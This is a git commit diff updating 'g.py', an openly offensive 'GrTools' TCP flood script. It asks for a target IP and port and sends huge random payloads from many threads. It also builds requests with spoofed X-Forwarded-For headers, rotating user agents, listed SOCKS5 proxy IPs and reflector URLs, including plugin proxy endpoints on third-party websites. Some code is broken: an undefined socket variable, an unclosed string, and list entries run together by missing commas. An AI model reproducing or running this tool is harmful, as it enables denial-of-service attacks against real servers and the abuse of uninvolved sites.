e646abc180cbbed96d7a040c5602fa96d3e4b436
ViaTopiaa <82694530+ViaTopiaa@users.noreply.github.com>
2023-07-22 22:10:54 +0700

    Update g.py

--- g.py
+++ g.py
@@ -1,33 +1,141 @@
 import socket
 import random
-import sys
 import datetime
-import ssl
-import http.client
 import threading
-import os
 import time
-from sys import stdout
 
 useragents = [
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1',
     'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1',
     'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
-    # ...
+     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
+     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
+     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
+     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
+     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
+     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
+     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
+     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
+     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
+     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
+     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
+     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
+     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
+     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
+     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
+     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
+     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
+     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
+     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
+     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
+     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
+     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',	
+     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN'
+     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
+     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
+     'Accept-Encoding: gzip, deflate\r\n',
+     'Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
+     'Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n',
+     'Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n',
+     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n',
+     'Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n',
+     'Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
+     'Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n',
+     'Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
+     'Accept: text/html, application/xhtml+xml',
+     'Accept-Language: en-US,en;q=0.5\r\n',
+     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n',
+     'Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n',
+     'Accept-Encoding: gzip, deflate\r\n',
+     'Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
+     'Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n',
+     'Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n',
+     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n',
+     'Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n',
+     'Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
+     'Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n',
+     'Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
+     'Accept: text/html, application/xhtml+xml',
+     'Accept-Language: en-US,en;q=0.5\r\n',
+     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n',
+     'Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n'
+    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
+    'Accept-Encoding: gzip, deflate\r\n',
+    'Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
+    'Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n',
+    'Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n',
+    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n',
+    'Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n',
+    'Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
+    'Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n',
+    'Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
+    'Accept: text/html, application/xhtml+xml',
+    'Accept-Language: en-US,en;q=0.5\r\n',
+    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n',
+    'Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n'
 ]
 
 socks5 = [
     '221.211.62.6:1111',
     '8.210.48.101:18193',
     '120.79.53.184:1080',
-    # ...
 ]
 
 https = [
-    'http://search.aol.com/aol/search?q=',
+     'http://search.aol.com/aol/search?q=',
     'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
     'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
-    # ...
+    'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=',
+    'https://drive.google.com/viewerng/viewer?url=',
+    'http://www.google.com/translate?u=',
+    'https://developers.google.com/speed/pagespeed/insights/?url=',
+    'https://replit.com/', 'https://check-host.net/', 'https://obaspro.my.id/',
+    'http://www.oldbrogue.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
+    'http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=',
+    'http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
+    'http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
+    'http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
+    'http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=',
+    'http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
+    'http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
+    'http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url='
+    'http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url='
+    'http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=',
+    'http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
+    'http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPASS',
+    'http://www.mcdp.eu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
+    'http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
+    'http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url='
+    'http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=',
+    'http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=',
+     'http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=',
+    'http://growtopiagame.com/', 'http://check-host.net/check-http?url=',
+    'http://ip2location.com/', 'https://pointblank.com/',
+    'https://www.ted.com/search?q=',
+    'https://drive.google.com/viewerng/viewer?url=',
+    'http://validator.w3.org/feed/check.cgi?url=',
+    'http://host-tracker.com/check_page/?furl=',
+    'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
+    'https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=',
+    'https://play.google.com/store/search?q=',
+    'http://jigsaw.w3.org/css-validator/validator?uri=',
+    'https://add.my.yahoo.com/rss?url=', 'http://www.google.com/?q=',
+    'https://www.cia.gov/index.html', 'https://www.google.ad/search?q=',
+    'https://www.google.ae/search?q=', 'https://vk.com/profile.php?redirect=',
+    'http://jigsaw.w3.org/css-validator/validator?uri=',
+    'https://add.my.yahoo.com/rss?url=',
+    'http://www.google.com/?q=',
+    'http://www.usatoday.com/search/results?q=',
+    'http://engadget.search.aol.com/search?q=',
+    'https://www.google.ae/search?q=', 'https://www.google.com.af/search?q=',
+    'https://www.google.com.ag/search?q=',
+    'https://www.google.com.ai/search?q=', 'https://www.google.al/search?q=',
+    'http://www.usatoday.com/search/results?q=',
+    'http://engadget.search.aol.com/search?q=',
+    'https://steamcommunity.com/market/search?q=',
+    'http://filehippo.com/search?q=',
+    'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
+    'http://eu.battle.net/wow/en/search?q=',
 ]
 
 def spoofer():
@@ -42,47 +150,64 @@ def spoofer():
 
 expiration_date = datetime.datetime.now() + datetime.timedelta(days=7)
 
-ip = str(input("\033[36m╔══\n╚══════>Server@GrTools~ Enter Target IP : "))
-port = int(input("\033[36m ╔══\n╚══════>Server@GrTools~ Input Port : "))
-t = int(input("\033[36m ╔══\n╚══════>Server@GrTools~ Input Times : "))
-th = int(input("\033[36m ╔══\n╚══════>Server@GrTools~ Input Thread : "))
-method = str(input("╔══\n╚══════>Server@GrTools~~ Enter Methods : "))
-
-def tcpfl():
-    get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
-    post_host = "POST /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
-    get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
-    referer = "Referer: " + random.choice(https) + ip + "\r\n"
-    connection = "Connection: Keep-Alive\r\n" + "\r\n"
-    content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
-    socks = "socks5: " + random.choice(socks5) + "\r\n"
-    length = "Content-Length: 0\r\n"
-    forward = "X-Forwarded-For: 1\r\n"
-    forwards = "Client-IP: " + ip + "\r\n"
-    accept = random.choice(useragents) + "\r\n"
-    mozila = "User-Agent: " + random.choice(useragents) + "\r\n"
-    httpss = "User-Agent: " + random.choice(https) + "\r\n"
-    connection += "X-Forwarded-For: " + spoofer() + "\r\n"
-    request = get_host + post_host + get_data + httpss + mozila + referer + content + socks + forward + forwards + accept + connection + connection + "\r\n"
-    grtools = random._urandom(150404)
-    while True:
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            sock.connect((ip, port))
-            sock.send(grtools)
-            sock.send(grtools)
-            sock.send(grtools)
-            sock.send(grtools)
-            for x in range(75000):
-                sock.send(grtools)
-                sock.send(grtools)
-                sock.send(grtools)
-                sock.send(grtools)
-                sock.send(grtools)
-            sock.close()
+ip = input("\033[36m╔══\n╚══════>Server@GrTools~ Enter Target IP : ")
+port = int(input("\033[36m╔══\n╚══════>Server@GrTools~ Input Port : "))
+t = int(input("\033[36m╔══\n╚══════>Server@GrTools~ Input Times : "))
+th = int(input("\033[36m╔══\n╚══════>Server@GrTools~ Input Thread : "))
+method = input("╔══\n╚══════>Server@GrTools~~ Enter Methods : ")
 
 if method == "TCP":
-    t = threading.Thread(target=tcpfl)
-    print("[GrBroadcast] Successfully sent")
-    t.start()
+
+    def tcpfl():
+        get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
+        post_host = "POST /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
+        referer = "Referer: " + random.choice(https) + ip + "\r\n"
+        connection = "Connection: Keep-Alive\r\n" + "\r\n"
+        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
+        socks = "socks5: " + random.choice(socks5) + "\r\n"
+        length = "Content-Length: 0\r\n"
+        forward = "X-Forwarded-For: 1\r\n"
+        forwards = "Client-IP: " + ip + "\r\n"
+        accept = random.choice(useragents) + "\r\n"
+        mozila = "User-Agent: " + random.choice(useragents) + "\r\n"
+        httpss = "User-Agent: " + random.choice(https) + "\r\n"
+        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
+        request = get_host + post_host + httpss + mozila + referer + content + socks + forward + forwards + accept + connection + connection + "\r\n"
+        grtools = random._urandom(150404)
+        while True:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                sock.connect((ip, port))
+                for _ in range(150000):
+                    sock.send(grtools)
+                    sock.send(grtools)
+                    sock.send(grtools)
+                    sock.send(grtools)
+                    sock.send(grtools)
+                    sock.send(grtools)
+                    sock.send(grtools)
+                    sock.send(grtools)
+                    sock.send(grtools)
+                    s.sendall(str.encode(request))
+                    s.sendall(str.encode(request))
+                    s.sendall(str.encode(request))
+                    s.sendall(str.encode(request))
+                    s.sendall(str.encode(request))
+                    s.sendall(str.encode(request))
+                    s.sendall(str.encode(request))
+                    s.sendall(str.encode(request))
+                    s.sendall(str.encode(request))
+                sock.close()
+            except Exception as e:
+                print("[!]Attacked)
+
+    threads = []
+    for _ in range(th):
+        if method == "TCP":
+            t = threading.Thread(target=tcpfl)
+            threads.append(t)
+            t.start()
+
+    for thread in threads:
+        thread.join()
